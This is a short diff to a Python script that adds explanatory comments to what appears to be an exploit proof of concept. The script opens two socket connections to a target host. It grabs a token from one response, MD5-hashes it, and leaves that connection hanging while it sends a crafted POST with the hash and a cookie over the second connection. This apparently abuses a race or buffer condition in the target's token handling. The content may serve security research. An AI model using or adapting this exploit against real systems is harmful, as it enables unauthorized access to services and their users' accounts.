@@ -46,6 +46,7 @@ Upgrade-Insecure-Requests: 1\r
 \r
 hash={hash}"""
 
+#Set up two connections to remote host
 s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s1.connect((targhost,targport))
@@ -70,6 +71,8 @@ while 1:
         if token:        
             token = token[0]            
             hash = tomd5(token)
+            #Once token is grabbed, break out and leave the HTTP connection open
+            #leaving the buffer in limbo
             break
         #Debug the response            
         #print(res_str)     
@@ -84,6 +87,8 @@ post_data = http_post.format(targhost=targhost,
                             cl=(len(hash)+5),
                             cookie=cookie)
 print(post_data)
+#Send the second request with other connection buffer still waiting to read
 s2.send(post_data)
 final = s2.recv(1024)
 print(final)
+     
